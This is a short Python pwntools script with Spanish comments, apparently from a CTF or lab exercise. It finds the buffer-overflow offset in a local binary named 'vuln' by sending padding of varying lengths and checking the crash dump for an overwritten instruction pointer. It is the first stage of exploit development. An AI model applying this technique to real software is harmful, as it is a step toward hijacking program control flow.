#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

# Probar localmente primero
io = process('/workspace/vuln')

io.recvuntil(b'What number would you like to guess?\n')
io.sendline(b'84')

io.recvuntil(b'Name? ')

# Probar diferentes offsets
for offset in [112, 116, 120, 124, 128]:
    print(f"\nProbando offset {offset}...")
    
    p = process('/workspace/vuln')
    p.sendline(b'84')
    p.recvuntil(b'Name? ')
    
    payload = b'A' * offset + p64(0x4141414141414141)
    p.sendline(payload)
    
    try:
        p.recvall(timeout=0.5)
    except:
        pass
    
    p.wait()
    
    try:
        core = p.corefile
        print(f"  RIP: {hex(core.rip)}, RSP: {hex(core.rsp)}")
        if core.rip == 0x4141414141414141:
            print(f"  ✓ Offset correcto: {offset}")
            break
    except:
        print(f"  No core dump")
    
    p.close()
